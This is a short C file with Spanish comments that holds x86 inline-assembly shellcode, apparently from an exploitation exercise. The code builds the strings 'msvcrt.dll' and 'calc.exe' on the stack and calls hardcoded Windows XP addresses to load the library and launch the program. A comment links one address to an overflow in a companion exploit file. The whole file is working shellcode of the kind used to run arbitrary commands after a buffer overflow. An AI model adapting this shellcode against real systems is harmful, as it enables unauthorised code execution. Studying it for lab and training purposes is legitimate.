/* ************************************************************************** */
/*   shellcode.c                                                              */
/*   By: maperez-                                                             */
/*   Created: 2022/08/02                                                      */
/* ************************************************************************** */

#include <stdio.h>
#include <windows.h>

int	main(void)
{
	__asm {
        push ebp
        mov ebp,esp
        xor edi,edi
        push edi
        sub esp,0ch
	    // Estas líneas expresan en hexadecimal los carácteres que conforman el nombre de la librería a cargar.
        mov byte ptr [ebp-0bh],6Dh // m
        mov byte ptr [ebp-0ah],73h // s
        mov byte ptr [ebp-09h],76h // v
        mov byte ptr [ebp-08h],63h // c
        mov byte ptr [ebp-07h],72h // r
        mov byte ptr [ebp-06h],74h // t
        mov byte ptr [ebp-05h],2Eh // .
        mov byte ptr [ebp-04h],64h // d
        mov byte ptr [ebp-03h],6Ch // l
        mov byte ptr [ebp-02h],6Ch // l
        lea eax,[ebp-0bh] // Variable en la que guardar el nombre de la librer�a en hexadecimal.
        push eax
        mov ebx,0x7c801d7b // Dirección de memoria donde está situada la orden de usar la librería (base de la pila).
        call ebx

        push ebp // Orden utilizada para ejecutar el programa de la librería cargada "System calc.exe".
        mov ebp,esp
        xor edi,edi
        push edi
        sub esp,08h // Estas líneas expresan en hexadecimal los carácteres que conforman el nombre del programa a ejecutar.
        mov byte ptr [ebp-09h],63h // c
        mov byte ptr [ebp-08h],61h // a
        mov byte ptr [ebp-07h],6Ch // l
        mov byte ptr [ebp-06h],63h // c
        mov byte ptr [ebp-05h],2Eh // .
        mov byte ptr [ebp-04h],65h // e
        mov byte ptr [ebp-03h],78h // x
        mov byte ptr [ebp-02h],65h // e
        lea eax,[ebp-09h]
        push eax
        mov ebx,0x77c293c7 // Dirección de memoria en a la que queremos que salte al desbordarse (exploit.c).
        call ebx
	}
}
